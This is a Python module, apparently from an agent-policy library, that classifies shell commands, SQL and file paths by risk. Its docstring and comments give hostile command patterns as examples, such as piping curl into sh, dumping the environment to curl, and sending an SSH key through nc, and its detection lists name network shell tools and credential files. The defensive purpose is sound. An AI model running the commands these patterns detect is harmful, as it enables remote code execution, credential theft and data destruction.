"""
What a tool call would do, in a few words a policy can decide on (CSL-Core 0.6.9).

Three deterministic classifiers for the values an agent passes to its tools. They read text only:
nothing is run, no file is opened, no network is touched. Whatever they cannot read with
certainty is classified as the most restrictive answer, so a policy built on them fails closed.

    command_class(command, scope_roots)  a shell command line
        OK            ordinary work: building, testing, reading, git, package managers
        REMOTE_EXEC   code fetched or decoded and run (curl ... | sh, bash <(curl ...), a file
                      downloaded and then executed, base64 -d | sh, eval of a substitution)
        DESTRUCTIVE   irreversible: rm -r of / ~ or anything outside the project, disks and
                      filesystems, shutdown, git push --force, dropping databases, cloud teardown
        PRIVILEGE     sudo, su, doas, pkexec, setuid bits
        SECRETS       reading keys and credentials (~/.ssh, ~/.aws, keychains, .netrc, ...)
        EXFIL         sending the environment or a credential file out (env | curl, curl -d @.env)
        PERSISTENCE   changing what runs later: shell startup files, authorized_keys, crontab,
                      launch agents, systemd units
        UNREADABLE    not a string, unbalanced quotes, control characters
    sql_class(query)
        READ          SELECT, WITH ... SELECT, EXPLAIN, SHOW, DESCRIBE
        WRITE         INSERT, UPDATE ... WHERE, DELETE ... WHERE, MERGE, COPY, CREATE, CALL, ...
        DESTRUCTIVE   DROP, TRUNCATE, ALTER, GRANT, REVOKE, DELETE or UPDATE without WHERE
        UNREADABLE    not a string, empty, unterminated quotes or comments
    path_class(path, scope_roots)
        IN_SCOPE      inside one of the roots (whole path segments, after resolving ..)
        OUTSIDE       anywhere else
        SENSITIVE     credentials and startup files, wherever the roots are (wins over IN_SCOPE)
        UNREADABLE    not an absolute path, ~, control characters, encoded separators

A command with several parts (;  &&  ||  |  &  newlines, $( ), backticks, <( )) gets the class
of its most serious part.
"""

from __future__ import annotations

import posixpath
import re
from typing import Any, Iterable, List, Optional

__all__ = ["command_class", "sql_class", "path_class", "args_command_class", "args_sql_class", "args_path_class", "count_of",
           "COMMAND_CLASSES", "SQL_CLASSES", "PATH_CLASSES"]

COMMAND_CLASSES = ["OK", "REMOTE_EXEC", "DESTRUCTIVE", "PRIVILEGE", "SECRETS", "EXFIL", "PERSISTENCE", "UNREADABLE"]
SQL_CLASSES = ["READ", "WRITE", "DESTRUCTIVE", "UNREADABLE"]
PATH_CLASSES = ["IN_SCOPE", "OUTSIDE", "SENSITIVE", "UNREADABLE"]

_SEVERITY = {c: i for i, c in enumerate(["OK", "PERSISTENCE", "SECRETS", "PRIVILEGE", "EXFIL", "DESTRUCTIVE",
                                          "REMOTE_EXEC", "UNREADABLE"])}
_CONTROL = re.compile(r"[\x00-\x08\x0b-\x1f\x7f]")

# ---------------------------------------------------------------------------
# paths
# ---------------------------------------------------------------------------

_SENSITIVE = [re.compile(p) for p in (
    r"(^|/)\.ssh(/|$)", r"(^|/)id_(rsa|dsa|ecdsa|ed25519)(\.pub)?$", r"(^|/)\.aws(/|$)", r"(^|/)\.azure(/|$)",
    r"(^|/)\.config/gcloud(/|$)", r"(^|/)\.kube/config$", r"(^|/)\.docker/config\.json$", r"(^|/)\.netrc$",
    r"(^|/)\.npmrc$", r"(^|/)\.pypirc$", r"(^|/)\.git-credentials$", r"(^|/)\.gnupg(/|$)", r"(^|/)\.password-store(/|$)",
    r"(^|/)Library/Keychains(/|$)", r"^/etc/(shadow|sudoers|passwd|gshadow)", r"^/etc/sudoers\.d(/|$)",
    r"(^|/)\.(bash_profile|bashrc|zshrc|zprofile|zshenv|profile|bash_login|login)$", r"(^|/)\.config/fish/config\.fish$",
    r"(^|/)Library/LaunchAgents(/|$)", r"^/Library/Launch(Agents|Daemons)(/|$)", r"^/etc/(systemd|cron|init\.d|profile\.d)",
    r"(^|/)\.config/systemd(/|$)", r"(^|/)\.terraform\.d/credentials", r"(^|/)\.vault-token$",
)]
_STARTUP = re.compile(r"(\.(bash_profile|bashrc|zshrc|zprofile|zshenv|profile|bash_login|login)$|config\.fish$|"
                      r"authorized_keys$|LaunchAgents|LaunchDaemons|/etc/(systemd|cron|init\.d|profile\.d)|"
                      r"\.config/systemd|/var/spool/cron)")


def _sensitive(p: str) -> bool:
    return any(rx.search(p) for rx in _SENSITIVE) or "authorized_keys" in p


def path_class(path: Any, scope_roots: Iterable[str] = ()) -> str:
    """IN_SCOPE, OUTSIDE, SENSITIVE or UNREADABLE (see the module docstring)."""
    if isinstance(path, str) and path.startswith("~") and not _CONTROL.search(path):
        return "SENSITIVE" if _sensitive("/HOME" + path[1:]) else "UNREADABLE"
    if not isinstance(path, str) or not path.startswith("/") or _CONTROL.search(path) or "\\" in path:
        return "UNREADABLE"
    if re.search(r"%(2e|2f|5c|00)", path, re.I):
        return "UNREADABLE"
    p = posixpath.normpath(path)
    if p.startswith("//"):
        return "UNREADABLE"
    if _sensitive(p):
        return "SENSITIVE"
    for r in scope_roots or []:
        if isinstance(r, str) and r.startswith("/"):
            root = posixpath.normpath(r)
            if p == root or p.startswith(root.rstrip("/") + "/"):
                return "IN_SCOPE"
    return "OUTSIDE"


# ---------------------------------------------------------------------------
# shell commands
# ---------------------------------------------------------------------------

_SEPARATORS = {";", "&&", "||", "&", "\n", "|", "|&", "(", ")", ";;", ";&"}
_REDIRECTS = {">", ">>", "<", "<<", "<<<", ">|", "&>", "&>>", ">&", "<&", "<>"}
_PREFIX = {"env", "nohup", "time", "nice", "ionice", "stdbuf", "command", "builtin", "exec", "timeout", "caffeinate",
           "unbuffer", "chronic", "noglob"}
_INTERPRETERS = {"sh", "bash", "zsh", "dash", "ksh", "fish", "csh", "tcsh", "python", "python2", "python3", "perl",
                 "ruby", "node", "deno", "bun", "php", "pwsh", "powershell", "lua", "osascript", "source", "."}
_FETCHERS = {"curl", "wget", "fetch", "aria2c", "http", "https", "xh", "lwp-request", "GET"}
_DECODERS = {"base64", "base32", "xxd", "openssl", "uudecode", "gunzip", "zcat", "rev"}
_SENDERS = {"curl", "wget", "nc", "ncat", "netcat", "socat", "scp", "rsync", "sftp", "ftp", "telnet", "http", "xh"}
_PRIV = {"sudo", "su", "doas", "pkexec", "runas", "gosu"}
_HOME_TOKENS = ("~", "$HOME", "${HOME}")


def _expand(tok: str, home: str = "/HOME") -> str:
    for h in _HOME_TOKENS:
        if tok == h:
            return home
        if tok.startswith(h + "/"):
            return home + tok[len(h):]
    return tok


def _tokens(command: str) -> Optional[List[str]]:
    import shlex

    lex = shlex.shlex(command, posix=True, punctuation_chars=";&|()<>")
    lex.whitespace_split = True
    lex.commenters = ""
    try:
        return list(lex)
    except ValueError:  # unbalanced quotes
        return None


def _substitutions(command: str) -> List[str]:
    """The commands inside $( ), backticks and <( ) >( ), which run too."""
    inner = re.findall(r"\$\(([^()]*(?:\([^()]*\)[^()]*)*)\)", command)
    inner += re.findall(r"`([^`]*)`", command)
    inner += re.findall(r"[<>]\(([^()]*)\)", command)
    return inner


def _split(tokens: List[str]):
    """Pipelines of simple commands: [[argv, argv, ...], ...], plus redirect targets per argv."""
    pipelines, pipe, argv, redirs = [], [], [], []
    expect_target = False
    for tok in tokens + [";"]:
        if expect_target:
            redirs.append((expect_target, tok))
            expect_target = False
            continue
        if tok in _REDIRECTS or re.fullmatch(r"\d?[<>]{1,2}&?", tok):
            expect_target = tok
            continue
        if tok in ("|", "|&"):
            pipe.append((argv, redirs))
            argv, redirs = [], []
            continue
        if tok in _SEPARATORS:
            if argv or redirs:
                pipe.append((argv, redirs))
            if pipe:
                pipelines.append(pipe)
            pipe, argv, redirs = [], [], []
            continue
        argv.append(tok)
    return pipelines


def _strip_prefix(argv: List[str]) -> List[str]:
    i = 0
    while i < len(argv):
        a = argv[i]
        if re.fullmatch(r"[A-Za-z_][A-Za-z0-9_]*=.*", a):
            i += 1
            continue
        base = posixpath.basename(a)
        if base in _PREFIX:
            i += 1
            while i < len(argv) and argv[i].startswith("-"):  # options of the prefix (timeout -s 9, nice -n 5)
                i += 1
                if i < len(argv) and re.fullmatch(r"\d+[smhd]?", argv[i]):
                    i += 1
            if base == "timeout" and i < len(argv) and re.fullmatch(r"\d+(\.\d+)?[smhd]?", argv[i]):
                i += 1
            continue
        break
    return argv[i:]


def _outside(path: str, scope: List[str]) -> bool:
    p = _expand(path)
    if p in ("/", "/HOME", "*", "/*", "/HOME/*", ".", "..", "./*", "../*") or p.startswith("../"):
        return p not in (".", "./*") or not scope  # the project's own folder is fine; its parent is not
    if p.startswith("/"):
        cls = path_class(p, scope)
        return cls != "IN_SCOPE"
    return False  # relative: inside the working folder


def _rm(args: List[str], scope: List[str]) -> bool:
    flags = "".join(a.lstrip("-") for a in args if a.startswith("-") and not a.startswith("--"))
    recursive = "r" in flags.lower() or "--recursive" in args
    targets = [a for a in args if not a.startswith("-")]
    if any(_expand(t) in ("/", "/HOME", "/*", "/HOME/*") or _expand(t).rstrip("/") in ("/", "/HOME") for t in targets):
        return True
    return recursive and any(_outside(t, scope) for t in targets)


def _simple(argv: List[str], redirs, scope: List[str]) -> str:
    """The class of one simple command (prefixes like env, nohup, timeout taken off)."""
    for kind, target in redirs:
        t = _expand(target)
        if kind.startswith(">") or kind in ("&>", "&>>", ">|"):
            if t.startswith(("/dev/tcp/", "/dev/udp/")):
                return "REMOTE_EXEC"  # a shell wired to a remote host
            if t.startswith("/dev/") and not t.startswith(("/dev/null", "/dev/stdout", "/dev/stderr", "/dev/tty", "/dev/fd/")):
                return "DESTRUCTIVE"
            if _STARTUP.search(t):
                return "PERSISTENCE"
            if _sensitive(t):
                return "SECRETS"
        elif _sensitive(t):
            return "SECRETS"
    argv = _strip_prefix(argv)
    if not argv:
        return "OK"
    cmd = posixpath.basename(argv[0])
    args = argv[1:]
    words = [_expand(a) for a in args]
    if cmd in _PRIV:
        return "PRIVILEGE"
    if cmd == "osascript" and any("administrator privileges" in a for a in args):
        return "PRIVILEGE"
    if cmd in ("nc", "ncat", "netcat") and any(a in ("-e", "-c", "--exec", "--sh-exec", "--lua-exec") for a in args):
        return "REMOTE_EXEC"  # a shell served to a remote host
    if cmd == "socat" and any("exec:" in a.lower() or "system:" in a.lower() for a in args):
        return "REMOTE_EXEC"
    if cmd in ("chmod",) and any(re.fullmatch(r"([ugoa]*\+s|[0-7]?[4-7][0-7]{3})", a) for a in args):
        return "PRIVILEGE"
    if cmd == "eval":
        return "REMOTE_EXEC" if any("$(" in a or "`" in a for a in args) else "OK"
    if cmd in ("rm", "unlink", "rmdir") and _rm(args, scope):
        return "DESTRUCTIVE"
    if cmd == "find" and ("-delete" in args or "-exec" in args and "rm" in args) and any(_outside(a, scope) for a in args[:1]):
        return "DESTRUCTIVE"
    if re.match(r"^(mkfs(\..+)?|wipefs|fdisk|sfdisk|parted|shred|diskutil|newfs.*|format)$", cmd):
        if cmd != "diskutil" or any(a.lower().startswith(("erase", "zero", "partition", "reformat")) for a in args):
            return "DESTRUCTIVE"
    if cmd == "dd" and any(a.startswith("of=/dev/") for a in args):
        return "DESTRUCTIVE"
    if cmd in ("shutdown", "reboot", "halt", "poweroff", "init") and (cmd != "init" or args[:1] in (["0"], ["6"])):
        return "DESTRUCTIVE"
    if cmd in ("chmod", "chown", "chgrp") and any(a in ("-R", "--recursive") for a in args) and \
            any(_outside(a, scope) for a in args if not a.startswith("-")):
        return "DESTRUCTIVE"
    if cmd == "git" and args[:1] == ["push"] and any(a in ("--force", "-f", "--mirror", "--delete", "-d") or
                                                     a.startswith("--force") or a.startswith("+") or a.startswith(":")
                                                     for a in args[1:]):
        return "DESTRUCTIVE"
    if cmd in ("psql", "mysql", "mariadb", "sqlite3", "sqlcmd", "clickhouse-client", "mongosh", "cockroach"):
        sql = [args[i + 1] for i, a in enumerate(args[:-1]) if a in ("-c", "-e", "--command", "--execute", "--eval", "-q")]
        sql += [a for a in args[1:] if re.match(r"(?is)^\s*(drop|truncate|delete|alter|update|insert)\b", a)]
        if any(sql_class(s) == "DESTRUCTIVE" for s in sql):
            return "DESTRUCTIVE"
    if cmd == "dropdb" or cmd == "redis-cli" and any(a.upper() in ("FLUSHALL", "FLUSHDB") for a in args):
        return "DESTRUCTIVE"
    if cmd == "terraform" and args[:1] == ["destroy"]:
        return "DESTRUCTIVE"
    if cmd == "kubectl" and args[:1] in (["delete"], ["drain"]):
        return "DESTRUCTIVE"
    if cmd == "docker" and (args[:2] in (["system", "prune"], ["volume", "prune"], ["volume", "rm"])):
        return "DESTRUCTIVE"
    if cmd in ("aws", "gcloud", "az") and any(a in ("rb", "delete", "delete-bucket", "terminate-instances",
                                                     "delete-db-instance", "delete-cluster") for a in args) or \
            cmd == "aws" and args[:2] == ["s3", "rm"] and "--recursive" in args:
        return "DESTRUCTIVE"
    if cmd == "crontab" and (not args or args[0] in ("-r", "-e", "-") or not args[0].startswith("-")):
        return "PERSISTENCE"
    if cmd == "launchctl" and args[:1] in (["load"], ["bootstrap"], ["enable"], ["submit"]):
        return "PERSISTENCE"
    if cmd == "systemctl" and args[:1] in (["enable"], ["link"]) or cmd == "systemctl" and "--user" in args and "enable" in args:
        return "PERSISTENCE"
    if cmd in ("tee", "cp", "mv", "ln", "install") and any(_STARTUP.search(w) for w in words):
        return "PERSISTENCE"
    if cmd in ("security",) and args[:1] and args[0].startswith(("find-generic-password", "find-internet-password",
                                                                  "dump-keychain", "export")):
        return "SECRETS"
    if cmd in _SENDERS:
        files = [w[1:] for w in words if w.startswith("@") and len(w) > 1]
        files += [words[i + 1] for i, a in enumerate(args[:-1]) if a in ("-T", "--upload-file", "-F", "--form")]
        if any(_sensitive(_expand(f.split("=", 1)[-1].lstrip("@"))) or f.split("=", 1)[-1].lstrip("@").endswith(".env")
               for f in files):
            return "EXFIL"
        if cmd in ("scp", "rsync", "sftp") and any(_sensitive(w) for w in words):
            return "EXFIL"
    if any(_sensitive(w) for w in words if not w.startswith("-")):
        return "SECRETS"
    return "OK"


def command_class(command: Any, scope_roots: Iterable[str] = ()) -> str:
    """OK, REMOTE_EXEC, DESTRUCTIVE, PRIVILEGE, SECRETS, EXFIL, PERSISTENCE or UNREADABLE."""
    if isinstance(command, (list, tuple)):
        if not all(isinstance(a, str) for a in command):
            return "UNREADABLE"
        import shlex
        command = " ".join(shlex.quote(a) for a in command)
    if not isinstance(command, str) or not command.strip() or _CONTROL.search(command):
        return "UNREADABLE"
    scope = [r for r in scope_roots or [] if isinstance(r, str)]
    worst = "OK"

    def take(c: str) -> None:
        nonlocal worst
        if _SEVERITY[c] > _SEVERITY[worst]:
            worst = c

    for inner in _substitutions(command):
        take(command_class(inner, scope) if inner.strip() else "OK")
        if re.search(r"\b(" + "|".join(sorted(_FETCHERS)) + r")\b", inner):
            if re.search(r"(^|[\s;|&(])(" + "|".join(re.escape(i) for i in sorted(_INTERPRETERS - {"."})) + r")\b",
                         command.replace(inner, "")) or command.lstrip().startswith(("eval", ". <(", "source <(")):
                take("REMOTE_EXEC")  # bash <(curl ...), sh -c "$(curl ...)"
    # fetched code piped into an interpreter, however it is grouped: { curl x; } | bash
    fetch_rx = r"(^|[\s;|&({])(" + "|".join(sorted(_FETCHERS)) + r")(\s|$)"
    pipe_rx = (r"\|\s*(sudo\s+)?(\S*/)?(" + "|".join(re.escape(i) for i in sorted(_INTERPRETERS - {".", "source"}))
               + r")\b(?!\s+[^\s|;&]+\.(py|sh|js|rb|pl))")
    if re.search(fetch_rx, command) and re.search(pipe_rx, command):
        take("REMOTE_EXEC")
    tokens = _tokens(command)
    if tokens is None:
        return "UNREADABLE"
    downloaded: List[str] = []
    for pipeline in _split(tokens):
        fetched = decoded = env_dump = secret_read = False
        for i, (argv, redirs) in enumerate(pipeline):
            take(_simple(argv, redirs, scope))
            if [posixpath.basename(x) for x in argv] in (["env"], ["printenv"], ["set"], ["export"], ["export", "-p"]):
                env_dump = True  # the whole environment, credentials included
                continue
            core = _strip_prefix(argv)
            if not core:
                continue
            cmd = posixpath.basename(core[0])
            if i > 0 and cmd in _INTERPRETERS and (fetched or decoded) and not any(a.endswith((".py", ".sh", ".js", ".rb"))
                                                                                     for a in core[1:]):
                take("REMOTE_EXEC")  # curl ... | sh, base64 -d | bash
            if i > 0 and cmd in _SENDERS and (env_dump or secret_read):
                take("EXFIL")  # env | curl -d @- ..., cat ~/.ssh/id_rsa | nc host 9
            if cmd in _FETCHERS:
                fetched = True
                for j, a in enumerate(core[1:-1], 1):
                    if a in ("-o", "-O", "--output", "--output-document"):
                        downloaded.append(posixpath.basename(core[j + 1]))
                for kind, target in redirs:
                    if kind.startswith(">"):
                        downloaded.append(posixpath.basename(target))
            if cmd in _DECODERS and any(a in ("-d", "--decode", "-D", "-r") for a in core[1:]):
                decoded = True
            if cmd in ("env", "printenv", "set", "export") and len(core) == 1:
                env_dump = True
            if any(_sensitive(_expand(a)) for a in core[1:]):
                secret_read = True
            if downloaded and (cmd in _INTERPRETERS and any(posixpath.basename(a) in downloaded for a in core[1:])
                               or core[0].startswith("./") and posixpath.basename(core[0]) in downloaded):
                take("REMOTE_EXEC")  # curl -o x.sh ... && bash x.sh
    return worst


# ---------------------------------------------------------------------------
# SQL
# ---------------------------------------------------------------------------

def _sql_statements(query: str) -> Optional[List[str]]:
    """Statements with comments and quoted text removed; None when a quote or comment is left open."""
    out, buf, i, n = [], [], 0, len(query)
    while i < n:
        c = query[i]
        if query.startswith("--", i):
            j = query.find("\n", i)
            i = n if j < 0 else j
            continue
        if query.startswith("/*", i):
            j = query.find("*/", i + 2)
            if j < 0:
                return None
            i = j + 2
            buf.append(" ")
            continue
        if c in ("'", '"', "`"):
            j = i + 1
            while j < n:
                if query[j] == c:
                    if j + 1 < n and query[j + 1] == c:  # doubled quote
                        j += 2
                        continue
                    break
                j += 1
            if j >= n:
                return None
            buf.append(" ? ")
            i = j + 1
            continue
        if c == "$":
            m = re.match(r"\$([A-Za-z_]*)\$", query[i:])
            if m:
                end = query.find(m.group(0), i + len(m.group(0)))
                if end < 0:
                    return None
                buf.append(" ? ")
                i = end + len(m.group(0))
                continue
        if c == ";":
            out.append("".join(buf))
            buf = []
            i += 1
            continue
        buf.append(c)
        i += 1
    out.append("".join(buf))
    return [s for s in (x.strip() for x in out) if s]


def sql_class(query: Any) -> str:
    """READ, WRITE, DESTRUCTIVE or UNREADABLE (see the module docstring)."""
    if not isinstance(query, str) or not query.strip() or _CONTROL.search(query):
        return "UNREADABLE"
    statements = _sql_statements(query)
    if not statements:
        return "UNREADABLE"
    worst = "READ"
    rank = {"READ": 0, "WRITE": 1, "DESTRUCTIVE": 2}
    for s in statements:
        words = re.findall(r"[A-Za-z_]+", s.upper())
        if not words:
            return "UNREADABLE"
        first = words[0]
        kind = "WRITE"
        if first in ("DROP", "TRUNCATE", "ALTER", "GRANT", "REVOKE", "RENAME", "VACUUM"):
            kind = "DESTRUCTIVE"
        elif first in ("SELECT", "WITH", "EXPLAIN", "SHOW", "DESCRIBE", "DESC", "VALUES", "TABLE", "PRAGMA"):
            body = set(words)
            if body & {"DROP", "TRUNCATE", "ALTER"}:
                kind = "DESTRUCTIVE"
            elif body & {"INSERT", "UPDATE", "DELETE", "MERGE", "INTO", "COPY", "UPSERT"} or (first == "PRAGMA" and "=" in s):
                kind = "WRITE" if not ({"DELETE", "UPDATE"} & body and "WHERE" not in body) else "DESTRUCTIVE"
            else:
                kind = "READ"
        elif first in ("DELETE", "UPDATE"):
            kind = "WRITE" if "WHERE" in words else "DESTRUCTIVE"
        elif first in ("BEGIN", "COMMIT", "ROLLBACK", "START", "SET", "USE"):
            kind = "READ" if first != "SET" else "WRITE"
        if rank[kind] > rank[worst]:
            worst = kind
    return worst


# ---------------------------------------------------------------------------
# the whole arguments of a call (tools whose parameter names are not known in advance)
# ---------------------------------------------------------------------------

_PATH_KEY = re.compile(r"(path|file|filename|dir|directory|dest|destination|source|src|target|notebook|folder|location)", re.I)
_COMMAND_KEY = re.compile(r"^(command|cmd|commands|script|shell_command|shell|code|bash|exec|run)$", re.I)
_SQL_KEY = re.compile(r"^(query|sql|statement|stmt|queries)$", re.I)
_PATH_RANK = {"IN_SCOPE": 0, "OUTSIDE": 1, "UNREADABLE": 2, "SENSITIVE": 3}


def _strings(value: Any) -> List[str]:
    if isinstance(value, str):
        return [value]
    if isinstance(value, (list, tuple)):
        return [v for v in value if isinstance(v, str)]
    return []


def args_path_class(args: Any, scope_roots: Iterable[str] = ()) -> str:
    """The most serious path_class over every path-like argument of a call. A relative path is taken
    under the first root. No path argument at all: UNREADABLE (a write then fails closed)."""
    if not isinstance(args, dict):
        return "UNREADABLE"
    roots = [r for r in scope_roots or [] if isinstance(r, str) and r.startswith("/")]
    worst = None
    for k, v in args.items():
        if not isinstance(k, str) or not _PATH_KEY.search(k):
            continue
        for p in _strings(v):
            if roots and p and not p.startswith(("/", "~")):
                p = posixpath.join(roots[0], p)
            c = path_class(p, roots)
            if worst is None or _PATH_RANK[c] > _PATH_RANK[worst]:
                worst = c
    return worst or "UNREADABLE"


def args_command_class(args: Any, scope_roots: Iterable[str] = ()) -> str:
    """command_class of the command argument of a call (UNREADABLE when there is none)."""
    if not isinstance(args, dict):
        return "UNREADABLE"
    worst = None
    for k, v in args.items():
        if isinstance(k, str) and _COMMAND_KEY.match(k):
            for cmd in _strings(v) or [v]:
                c = command_class(cmd, scope_roots)
                if worst is None or _SEVERITY[c] > _SEVERITY[worst]:
                    worst = c
    return worst or "UNREADABLE"


def args_sql_class(args: Any) -> str:
    """sql_class of the query argument of a call (UNREADABLE when there is none)."""
    if not isinstance(args, dict):
        return "UNREADABLE"
    rank = {"READ": 0, "WRITE": 1, "UNREADABLE": 2, "DESTRUCTIVE": 3}
    worst = None
    for k, v in args.items():
        if isinstance(k, str) and _SQL_KEY.match(k):
            for q in _strings(v) or [v]:
                c = sql_class(q)
                if worst is None or rank[c] > rank[worst]:
                    worst = c
    return worst or "UNREADABLE"


def count_of(value: Any) -> Any:
    """The length of a list-like argument (how many recipients, rows, files); anything else unchanged,
    so a value that is neither a list nor a number still fails to map (and is refused)."""
    if isinstance(value, (list, tuple, set)):
        return len(value)
    return value
